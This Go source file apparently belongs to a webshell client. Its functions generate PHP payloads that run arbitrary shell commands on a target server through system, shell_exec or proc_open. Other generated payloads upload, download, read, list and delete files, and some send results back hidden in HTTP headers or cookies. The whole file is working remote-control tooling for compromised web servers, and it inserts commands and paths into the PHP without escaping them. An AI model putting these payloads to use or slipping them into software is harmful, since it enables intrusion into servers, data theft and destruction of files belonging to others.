package phpadapter

import "github.com/eatbytes/razboy/normalizer"

func _getSystemCMD(cmd, letter string) string {
	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
}

func _getShellExecCMD(cmd, letter string) string {
	return "$" + letter + "=shell_exec('" + cmd + "');"
}

func _getProcOpenCMD(cmd, scope, proc, letter string) string {
	if scope == "" {
		scope = "./"
	}

	return `$opt = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe', 'w'));
	$scope='` + scope + `';
	$proc=proc_open('` + proc + `', $opt,$pipes,$scope);
	if(is_resource($proc)){
		fwrite($pipes[0],'` + cmd + `');
		fclose($pipes[0]);
		$s=stream_get_contents($pipes[1]);
		fclose($pipes[1]);
		$e=stream_get_contents($pipes[2]);
		fclose($pipes[2]);
		$c=proc_close($proc);
		$` + letter + `=array('success'=>$s,'error'=>$e,'code'=>$c);
		$` + letter + `=json_encode($` + letter + `);
	}`
}

func CreateCMD(cmd, scope, method string) string {
	var contexter, shellCMD string

	if scope != "" {
		contexter = "cd " + scope + " && "
	}

	shellCMD = contexter + cmd

	switch method {
	case "shell_exec":
		shellCMD = _getShellExecCMD(shellCMD, "r")
	case "proc":
		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
	default:
		shellCMD = _getSystemCMD(shellCMD, "r")
	}

	return shellCMD
}

func CreateCD(cmd, scope, method string) string {
	var cd string

	cd = cmd + " && pwd"
	cd = CreateCMD(cd, scope, method)

	return cd
}

func CreateDownload(dir string) string {
	var php string

	php = `if(file_exists('` + dir + `')){
		header('Content-Description: File Transfer');
    	header('Content-Type: application/octet-stream');
    	header('Content-Transfer-Encoding: binary');
    	header('Expires: 0');
    	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    	header('Pragma: public');
		header('Content-Length: ' . filesize('` + dir + `'));
		header('Content-Disposition: attachment; filename='.basename('` + dir + `'));
		readfile('` + dir + `');exit();
	}`

	return php
}

func CreateUpload(dir string) string {
	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" +
		"if(file_exists('" + dir + "')){echo(" + normalizer.PHPEncode("1") + ");}"
}

func CreateListFile(scope string) string {
	return "$r=implode('\n', scandir(" + scope + "));"
}

func CreateReadFile(file string) string {
	return "$r=file_get_contents('" + file + "');"
}

func CreateDelete(scope string) string {
	return "if(is_dir('" + scope + "')){$r=rmdir('" + scope + "');}else{$r=unlink('" + scope + "');}"
}

func CreateAnswer(method, parameter string) string {
	if method == "HEADER" {
		return "header('" + parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
	}

	if method == "COOKIE" {
		return "setcookie('" + parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
	}

	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
}
